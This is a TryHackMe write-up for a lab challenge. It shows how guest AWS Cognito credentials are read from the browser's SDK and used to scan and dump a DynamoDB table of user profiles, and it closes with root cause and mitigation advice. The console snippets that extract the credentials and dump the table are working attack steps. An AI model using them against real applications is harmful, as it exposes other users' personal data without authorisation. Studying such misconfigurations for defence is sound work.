# Byte Lotus Wellness — AWS Cognito Identity Pool Misconfiguration (TryHackMe)

## Overview

**Byte Lotus Wellness** is a cloud-focused TryHackMe challenge that demonstrates the risks of misconfigured AWS Identity and Access Management (IAM) permissions. The application provides a "guest" wellness dashboard without requiring users to log in. Although no authentication is performed, the application still retrieves user-specific data by issuing temporary AWS credentials through an **Amazon Cognito Identity Pool**.

The objective of the challenge was to:

- Identify the AWS service issuing credentials behind the scenes.
- Obtain the temporary AWS credentials.
- Abuse the assigned IAM permissions.
- Enumerate the DynamoDB table.
- Retrieve the flag stored in another guest's record.

---

## Skills Demonstrated

- AWS Cloud Security
- Amazon Cognito Identity Pools
- AWS STS Temporary Credentials
- Client-side JavaScript Analysis
- Browser Developer Tools
- Amazon DynamoDB
- IAM Permission Enumeration
- Cloud Misconfiguration Exploitation

---

# Initial Reconnaissance

Opening the application presented a simple dashboard.

> **"No account needed — we set you up as a guest the moment you arrived."**

This immediately suggested that authentication was happening transparently.

Inspecting the page source revealed that the application loaded the AWS JavaScript SDK.

```html
<script src="https://sdk.amazonaws.com/js/aws-sdk-2.1500.0.min.js"></script>
<script src="app.js"></script>
```

The interesting functionality resided inside **app.js**.

---

# Source Code Analysis

Reviewing the JavaScript revealed the following:

```javascript
const IDENTITY_POOL_ID =
"us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";

AWS.config.credentials =
new AWS.CognitoIdentityCredentials({
    IdentityPoolId: IDENTITY_POOL_ID,
});
```

The application was using an **Amazon Cognito Identity Pool** to provide every visitor with temporary AWS credentials.

No login page existed because every visitor automatically received an unauthenticated guest identity.

After obtaining credentials, the application queried DynamoDB directly.

```javascript
dynamodb.getItem({
    TableName: "complimentary-GuestWellnessProfiles",
    Key: {
        guest_id: {
            S: guestId()
        }
    }
});
```

The application only requested the current guest's record.

This raised an important question:

> **Can these credentials access more than just one item?**

---

# Extracting Temporary AWS Credentials

Since the AWS SDK was already initialized in the browser, obtaining the credentials was straightforward.

Using the browser console:

```javascript
AWS.config.credentials
```

or

```javascript
AWS.config.credentials.get(function () {
    console.log(AWS.config.credentials);
});
```

The object exposed:

- Access Key ID
- Secret Access Key
- Session Token
- Cognito Identity ID

Example:

```text
AccessKeyId:
ASIA...

SecretAccessKey:
********

SessionToken:
IQoJb3...

IdentityId:
us-east-1:...
```

These are temporary AWS STS credentials issued by Amazon Cognito.

---

# Enumerating DynamoDB Permissions

Instead of configuring the AWS CLI immediately, I continued using the AWS SDK already loaded in the browser.

Creating a DynamoDB client:

```javascript
const ddb = new AWS.DynamoDB();
```

The challenge description hinted:

> *"don't just check what it gives YOU. ask it for more 👀"*

The most obvious test was attempting a full table scan.

```javascript
ddb.scan(
{
    TableName:
    "complimentary-GuestWellnessProfiles"
},
(err,data)=>{
    console.log(err);
    console.log(data);
});
```

The response was:

```text
null

Items: 5
Count: 5
ScannedCount: 5
```

No authorization error occurred.

The unauthenticated guest IAM role possessed permission to perform a **DynamoDB Scan** against the entire table.

---

# Dumping the DynamoDB Table

To make the response easier to read:

```javascript
ddb.scan(
{
    TableName:
    "complimentary-GuestWellnessProfiles"
},
(err,data)=>{
    console.log(JSON.stringify(data,null,2));
});
```

The scan returned every guest profile stored in the database.

Example:

```json
{
  "guest_id": "guest-vip-042",
  "email": "vip042@hackerholidays.thm",
  "password": "escalation_only",
  "notes": "If you're reading this, the wellness app's guest role can read every profile, not just its own. <FLAG IS HERE>"
}
```

The flag was located inside another guest's notes.

---

# Flag

```text
FLAG
```

---

# Root Cause Analysis

The application architecture was approximately:

```
Visitor
    │
    ▼
Website
    │
    ▼
Amazon Cognito Identity Pool
    │
    ▼
AWS STS Temporary Credentials
    │
    ▼
IAM Guest Role
    │
    ▼
Amazon DynamoDB
```

The application relied entirely on client-side authorization.

Although Cognito correctly issued temporary credentials, the IAM role attached to unauthenticated users granted excessive permissions.

Instead of limiting users to retrieving only their own record using `GetItem`, the IAM policy also allowed:

- `dynamodb:Scan`

This enabled any anonymous visitor to enumerate every record stored in the DynamoDB table.

---

# Security Impact

The vulnerability exposed sensitive customer information including:

- Full names
- Email addresses
- Phone numbers
- Passwords
- Location data
- Internal notes

In a production environment, this would result in a complete data breach for every user of the application.

---

# Mitigation

To prevent this issue:

- Remove `dynamodb:Scan` from unauthenticated IAM roles.
- Apply the Principle of Least Privilege.
- Restrict DynamoDB access using IAM condition keys such as `dynamodb:LeadingKeys`.
- Route database operations through a backend API that performs authorization.
- Never expose sensitive information directly to client-side applications.
- Store passwords securely using strong hashing algorithms instead of plaintext.

---

# Lessons Learned

This challenge highlights a common cloud security mistake:

> **Authentication does not equal Authorization.**

Amazon Cognito successfully authenticated anonymous users and issued temporary AWS credentials. However, because the attached IAM role was overly permissive, every guest effectively gained the ability to enumerate the entire DynamoDB table.

This challenge demonstrates why properly scoped IAM policies are essential when building serverless and cloud-native applications.

---

## Tools Used

- Browser Developer Tools
- AWS JavaScript SDK
- Amazon Cognito Identity Pools
- AWS STS
- Amazon DynamoDB

---

## Key Takeaways

- Client-side AWS credentials should never have excessive permissions.
- Amazon Cognito Identity Pools require carefully scoped IAM roles.
- Temporary credentials are only as secure as the permissions attached to them.
- Misconfigured IAM policies can lead to complete data exposure even without traditional authentication bypasses.
